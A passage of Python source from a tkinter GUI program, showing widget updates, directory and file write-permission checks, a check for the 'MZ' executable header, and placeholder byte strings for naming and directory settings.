							self.MessageType.insert(tkinter.END,self.LanguagesEncoding[self.In][19])
					self.MessageType.configure(state=tkinter.DISABLED)
					self.MessageStatus.configure(state=tkinter.NORMAL)
					self.MessageStatus.delete("1.0", tkinter.END)
					self.MessageStatus.insert(tkinter.END,self.LanguagesEncoding[self.In][self.StatusCodeIndex])
					self.MessageStatus.configure(state=tkinter.DISABLED)
					self.InputName.configure(width=self.CodeSetting[str(self.L[-1])])

					self.Generate.configure(text=self.LanguagesEncoding[self.In][10])
				if not self.L[-1].get():
					self.L[-1].set(True)

			time.sleep(0.001)

def PermissionCheckDir(Dir):
	file = "TESTING_FILE"
	while os.path.isfile(file):
		file+="_"
	try:
		open(Dir+"\\"+file, "w")
		os.remove(Dir+"\\"+file)
		return True
	except PermissionError:
		return False

def OverwritePermission(file):
	try:
		open(file, "a")
		return True
	except PermissionError:
		return False
#NOTE : ADD IN CONVENTION ( NAMING )
ScanningFile = lambda pathfile:(True if open(pathfile,"rb").read(2)==b"MZ" else False);

ASCII = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g',
'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S',
'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
Atterrisk_D = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  # Directory randomization
Atterrisk_N = b"******************************************************************************\
**********************************************************************************************\
****************************************************************************************" # Naming convention

mainW = tkinter.Tk()
MainWindows(mainW, title)
# Sorry if you are reading my horribly messed up codes, it's just i was too lazy to comment properly :P
